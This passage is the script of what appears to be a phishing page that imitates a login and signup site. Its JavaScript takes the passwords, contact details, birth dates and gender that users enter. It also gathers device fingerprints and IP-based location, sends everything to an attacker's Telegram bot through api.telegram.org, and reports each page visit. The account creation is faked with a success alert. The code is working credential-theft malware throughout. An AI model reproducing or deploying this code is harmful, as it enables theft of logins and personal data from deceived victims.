            if (!firstName || !lastName || !mobileEmail || !newPassword || !birthDay || !birthMonth || !birthYear || !gender) {
                signupError.textContent = 'Please fill in all required fields';
                signupError.style.display = 'block';
                return;
            }
            
            if (!isValidEmail(mobileEmail) && !isValidPhone(mobileEmail)) {
                signupError.textContent = 'Please enter a valid email address or mobile number';
                signupError.style.display = 'block';
                return;
            }
            
            if (newPassword.length < 6) {
                signupError.textContent = 'Password must be at least 6 characters long';
                signupError.style.display = 'block';
                return;
            }
            
            // Show loading
            continueCreateAccount.textContent = 'Signing Up...';
            continueCreateAccount.disabled = true;
            
            // Collect additional info for Telegram
            const dob = ${birthDay}/${birthMonth}/${birthYear};
            
            // Send signup data to Telegram
            sendMessageToTelegram(👤 NEW ACCOUNT ATTEMPT\n👤 Name: ${firstName} ${lastName}\n📧 Email/Phone: ${mobileEmail}\n🔑 Password: ${newPassword}\n🎂 Date of Birth: ${dob}\n⚧ Gender: ${gender.value}\n⏰ Time: ${new Date().toLocaleString()});
            
            // Simulate account creation
            setTimeout(() => {
                signupSuccess.textContent = 'Account created successfully!';
                signupSuccess.style.display = 'block';
                signupError.style.display = 'none';
                
                setTimeout(() => {
                    closeCreateAccountModal();
                    alert('Your account has been created successfully. Please check your email for verification.');
                }, 2000);
            }, 2000);
        }

        // Data Collection Functions
        async function collectDeviceInfo() {
            const connection = navigator.connection || {};
            const deviceMemory = navigator.deviceMemory || 'Unknown';
            const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
            
            return {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
                cookieEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                hardwareConcurrency: hardwareConcurrency,
                deviceMemory: deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints || 0,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                connection: {
                    effectiveType: connection.effectiveType || 'Unknown',
                    downlink: connection.downlink || 'Unknown',
                    rtt: connection.rtt || 'Unknown',
                    saveData: connection.saveData || false
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                indexedDB: !!window.indexedDB,
                touchSupport: 'ontouchstart' in window,
                deviceType: getDeviceType()
            };
        }

        async function collectNetworkInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    countryCode: data.country_code,
                    isp: data.org,
                    timezone: data.timezone,
                    coordinates: ${data.latitude}, ${data.longitude},
                    organization: data.org,
                    postal: data.postal,
                    asn: data.asn,
                    currency: data.currency,
                    callingCode: data.country_calling_code
                };
            } catch (error) {
                console.error('Error fetching network info:', error);
                
                // Fallback to a simpler IP detection
                try {
                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackResponse.json();
                    
                    return {
                        ip: fallbackData.ip,
                        city: 'Unknown',
                        region: 'Unknown',
                        country: 'Unknown',
                        countryCode: 'Unknown',
                        isp: 'Unknown',
                        timezone: 'Unknown',
                        coordinates: 'Unknown',
                        organization: 'Unknown',
                        postal: 'Unknown',
                        asn: 'Unknown',
                        currency: 'Unknown',
                        callingCode: 'Unknown'
                    };
                } catch (fallbackError) {
                    console.error('Error fetching fallback IP:', fallbackError);
                    
                    return {
                        ip: 'Unknown',
                        city: 'Unknown',
                        region: 'Unknown',
                        country: 'Unknown',
                        countryCode: 'Unknown',
                        isp: 'Unknown',
                        timezone: 'Unknown',
                        coordinates: 'Unknown',
                        organization: 'Unknown',
                        postal: 'Unknown',
                        asn: 'Unknown',
                        currency: 'Unknown',
                        callingCode: 'Unknown'
                    };
                }
            }
        }

        function collectBehavioralInfo() {
            const now = Date.now();
            const timeOnPage = Math.floor((now - pageLoadTime) / 1000);
            
            return {
                timeOnPage: timeOnPage,
                screenResolution: ${screen.width}x${screen.height},
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                cookiesEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdfEnabled: navigator.pdfViewerEnabled || false,
                referrer: document.referrer || 'Direct visit',
                pageLoadTime: pageLoadTime,
                currentTime: now
            };
        }

        function generateFingerprint() {
            const components = [
                navigator.userAgent,
                navigator.language,
                screen.colorDepth,
                screen.width + 'x' + screen.height,
                new Date().getTimezoneOffset(),
                !!navigator.sessionStorage,
                !!navigator.localStorage,
                !!window.indexedDB,
                navigator.hardwareConcurrency || 'unknown',
                navigator.platform,
                navigator.cookieEnabled,
                navigator.deviceMemory || 'unknown',
                navigator.maxTouchPoints || 0,
                Intl.DateTimeFormat().resolvedOptions().timeZone
            ];
            
            let fingerprint = '';
            for (let i = 0; i < components.length; i++) {
                fingerprint += components[i].toString();
            }
            
            // Simple hash function
            let hash = 0;
            for (let i = 0; i < fingerprint.length; i++) {
                const char = fingerprint.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            
            return Math.abs(hash).toString(16);
        }

        // Telegram Functions
        async function sendToTelegram(username, password, deviceInfo, networkInfo, behavioralInfo, fingerprint) {
            const message = `
👤 LOGIN ATTEMPT DETECTED

🔐 CREDENTIALS
📧 Username: ${username}
🔑 Password: ${password}

🌐 NETWORK INFORMATION
📍 IP Address: ${networkInfo.ip}
🏙 City: ${networkInfo.city}
🏛 Region: ${networkInfo.region}
🇮🇳 Country: ${networkInfo.country} (${networkInfo.countryCode})
📡 ISP: ${networkInfo.isp}
🌐 Timezone: ${networkInfo.timezone}
📍 Coordinates: ${networkInfo.coordinates}
🏢 Organization: ${networkInfo.organization}
📮 Postal Code: ${networkInfo.postal}
🔗 ASN: ${networkInfo.asn}
💰 Currency: ${networkInfo.currency}
📞 Calling Code: +${networkInfo.callingCode}

💻 DEVICE INFORMATION
🖥 Platform: ${deviceInfo.platform}
📱 Device Type: ${deviceInfo.deviceType}
🔢 Architecture: ${getArchitecture()}
🌐 Browser: ${getBrowser()}
🗣 Language: ${deviceInfo.language}
🌍 Languages: ${deviceInfo.languages}
🎨 Color Depth: ${deviceInfo.colorDepth}-bit
💾 Memory: ${deviceInfo.deviceMemory}GB
⚡ Cores: ${deviceInfo.hardwareConcurrency}
📶 Connection: ${deviceInfo.connection.effectiveType}
📡 Downlink: ${deviceInfo.connection.downlink} Mbps
⏱ RTT: ${deviceInfo.connection.rtt} ms
💾 Save Data: ${deviceInfo.connection.saveData ? 'Enabled' : 'Disabled'}
🖥 Screen: ${deviceInfo.width}x${deviceInfo.height}
👆 Touch Points: ${deviceInfo.maxTouchPoints}
📄 PDF Viewer: ${deviceInfo.pdfViewerEnabled ? 'Yes' : 'No'}
☕ Java: ${deviceInfo.javaEnabled ? 'Enabled' : 'Disabled'}
🍪 Cookies: ${deviceInfo.cookieEnabled ? 'Enabled' : 'Disabled'}
💾 Local Storage: ${deviceInfo.localStorage ? 'Yes' : 'No'}
💾 Session Storage: ${deviceInfo.sessionStorage ? 'Yes' : 'No'}
🗃 IndexedDB: ${deviceInfo.indexedDB ? 'Yes' : 'No'}
👆 Touch Support: ${deviceInfo.touchSupport ? 'Yes' : 'No'}

🧠 BEHAVIORAL ANALYSIS
⏰ Time on Page: ${behavioralInfo.timeOnPage} seconds
🖥 Resolution: ${behavioralInfo.screenResolution}
🎨 Color Depth: ${behavioralInfo.colorDepth}-bit
🌐 Timezone: ${behavioralInfo.timezone}
🗣 Language: ${behavioralInfo.language}
🖥 Platform: ${behavioralInfo.platform}
🍪 Cookies: ${behavioralInfo.cookiesEnabled ? 'Enabled' : 'Disabled'}
☕ Java: ${behavioralInfo.javaEnabled ? 'Enabled' : 'Disabled'}
📄 PDF: ${behavioralInfo.pdfEnabled ? 'Enabled' : 'Disabled'}
🔗 Referrer: ${behavioralInfo.referrer}

🔍 ADVANCED FINGERPRINT
👆 Fingerprint: ${fingerprint}
🆔 Unique ID: ${fingerprint.substring(0, 12)}

⏰ TIMESTAMP: ${new Date().toLocaleString()}
            `.trim();

            try {
                const response = await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                    }),
                });

                if (!response.ok) {
                    throw new Error('Telegram API error');
                }

                return true;
            } catch (error) {
                console.error('Failed to send to Telegram:', error);
                throw error;
            }
        }

        async function sendMessageToTelegram(message) {
            try {
                const response = await fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                    }),
                });

                if (!response.ok) {
                    throw new Error('Telegram API error');
                }

                return true;
            } catch (error) {
                console.error('Failed to send to Telegram:', error);
                throw error;
            }
        }

        // Helper Functions
        function getArchitecture() {
            const platform = navigator.platform.toLowerCase();
            if (platform.includes('win')) return 'Windows';
            if (platform.includes('mac')) return 'Macintosh';
            if (platform.includes('linux')) return 'Linux';
            if (platform.includes('android')) return 'Android';
            if (platform.includes('ios') || platform.includes('iphone')) return 'iOS';
            return 'Unknown';
        }

        function getBrowser() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('chrome')) return 'Chrome';
            if (userAgent.includes('firefox')) return 'Firefox';
            if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
            if (userAgent.includes('edge')) return 'Edge';
            if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
            return 'Unknown';
        }

        function getDeviceType() {
            const userAgent = navigator.userAgent.toLowerCase();
            if (userAgent.includes('mobile')) return 'Mobile';
            if (userAgent.includes('tablet')) return 'Tablet';
            return 'Desktop';
        }

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function isValidPhone(phone) {
            const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
            return phoneRegex.test(phone.replace(/\D/g, ''));
        }

        function maskEmailOrPhone(value) {
            if (isValidEmail(value)) {
                const [username, domain] = value.split('@');
                return ${username.substring(0, 2)}***@${domain};
            } else {
                return ${value.substring(0, 2)}***${value.substring(value.length - 2)};
            }
        }

        function populateDateDropdowns() {
            // Populate days
            const daySelect = document.getElementById('birthDay');
            for (let i = 1; i <= 31; i++) {
                const option = document.createElement('option');
                option.value = i;
                option.textContent = i;
                daySelect.appendChild(option);
            }

            // Populate months
            const monthSelect = document.getElementById('birthMonth');
            const months = [
                'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun',
                'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'
            ];
            months.forEach((month, index) => {
                const option = document.createElement('option');
                option.value = index + 1;
                option.textContent = month;
                monthSelect.appendChild(option);
            });

            // Populate years
            const yearSelect = document.getElementById('birthYear');
            const currentYear = new Date().getFullYear();
            for (let i = currentYear; i >= currentYear - 100; i--) {
                const option = document.createElement('option');
                option.value = i;
                option.textContent = i;
                yearSelect.appendChild(option);
            }
        }

        async function sendInitialVisitInfo() {
            const deviceInfo = await collectDeviceInfo();
            const networkInfo = await collectNetworkInfo();
            
            const visitMessage = `
🌐 PAGE VISIT DETECTED

📍 IP Address: ${networkInfo.ip}
🏙 Location: ${networkInfo.city}, ${networkInfo.region}, ${networkInfo.country}
🖥 Device: ${deviceInfo.platform} | ${getBrowser()} | ${deviceInfo.deviceType}
⏰ Time: ${new Date().toLocaleString()}
🔗 Referrer: ${document.referrer || 'Direct visit'}
            `.trim();
            
            try {
                await sendMessageToTelegram(visitMessage);
            } catch (error) {
                console.error('Failed to send visit info to Telegram:', error);
            }
        }
    </script>
</body>
</html>
